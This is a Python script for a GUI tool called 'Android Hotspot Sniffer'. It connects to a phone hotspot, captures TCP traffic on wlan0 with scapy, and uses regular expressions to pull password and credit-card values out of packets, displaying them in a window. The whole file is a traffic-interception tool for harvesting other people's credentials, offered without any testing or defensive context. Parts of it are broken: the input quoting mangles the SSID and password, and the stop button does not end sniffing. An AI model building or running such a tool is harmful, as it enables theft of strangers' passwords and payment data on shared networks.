import wifi
from scapy.all import *
import os
import re
import tkinter as tk
from tkinter import messagebox
import subprocess
import shlex
import threading

class AndroidHotspotSniffer:
    def __init__(self):
        self.window = None
        self.ssid_entry = None
        self.password_entry = None
        self.sensitive_data = None
        self.sniffing = False

    def sanitize_input(self, input_str):
        """Sanitize user input to prevent command injection."""
        return shlex.quote(input_str.strip())

    def connect_to_hotspot(self, ssid, password):
        """Connect to the specified Android hotspot."""
        ssid = self.sanitize_input(ssid)
        password = self.sanitize_input(password)
        try:
            wifi.connect(ssid, password)
            messagebox.showinfo("Connection Status", "Connected to the Android hotspot.")
        except Exception as e:
            messagebox.showerror("Connection Error", f"Error connecting: {e}")

    def sniff_data(self, iface):
        """Start sniffing packets on the specified interface."""
        self.sniffing = True
        sniff(iface=iface, prn=self.process_packet)

    def process_packet(self, packet):
        """Process each captured packet to extract sensitive data."""
        try:
            if packet.haslayer(TCP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst

                if src_ip == "192.168.43.1" or dst_ip == "192.168.43.1":
                    payload = bytes(packet[TCP].payload)
                    self.extract_sensitive_data(payload)
        except Exception as e:
            print(f"Error processing packet: {e}")

    def extract_sensitive_data(self, payload):
        """Extract sensitive data from the packet payload."""
        try:
            if b'password' in payload or b'credit card' in payload or b'social security' in payload:
                extracted_data = re.findall(b'password=(.*)', payload) or re.findall(b'credit card=(.*)', payload)

                for data in extracted_data:
                    decoded_data = data.decode()
                    print(decoded_data)
                    self.sensitive_data.insert(tk.END, f"{decoded_data}\n")
        except Exception as e:
            print(f"Error extracting data: {e}")

    def stop_sniffing(self):
        """Stop the sniffing process."""
        self.sniffing = False
        messagebox.showinfo("Sniffing Status", "Sniffing stopped.")

    def clear_sensitive_data(self):
        """Clear the displayed sensitive data."""
        self.sensitive_data.delete(1.0, tk.END)

    def run(self):
        """Run the main application."""
        self.window = tk.Tk()
        self.window.title("Android Hotspot Sniffer")

        # Create input fields for SSID and Password
        self.create_input_fields()

        # Create buttons for actions
        self.create_buttons()

        self.window.mainloop()

    def create_input_fields(self):
        """Create input fields for SSID and Password."""
        tk.Label(self.window, text="SSID:").pack()
        self.ssid_entry = tk.Entry(self.window)
        self.ssid_entry.pack()

        tk.Label(self.window, text="Password:").pack()
        self.password_entry = tk.Entry(self.window, show="*")
        self.password_entry.pack()

        self.sensitive_data = tk.Text(self.window, height=20, width=50)
        self.sensitive_data.pack()

    def create_buttons(self):
        """Create action buttons."""
        connect_button = tk.Button(self.window, text="Connect", command=lambda: self.connect_to_hotspot(self.ssid_entry.get(), self.password_entry.get()))
        connect_button.pack()

        start_sniffing_button = tk.Button(self.window, text="Start Sniffing", command=self.start_sniffing_thread)
        start_sniffing_button.pack()

        stop_sniffing_button = tk.Button(self.window, text="Stop Sniffing", command=self.stop_sniffing)
        stop_sniffing_button.pack()

        clear_button = tk.Button(self.window, text="Clear Data", command=self.clear_sensitive_data)
        clear_button.pack()

    def start_sniffing_thread(self):
        """Start sniffing in a separate thread to keep UI responsive."""
        threading.Thread(target=self.sniff_data, args=("wlan0",), daemon=True).start()

# Run the AndroidHotspotSniffer
if __name__ == "__main__":
    AndroidHotspotSniffer().run()
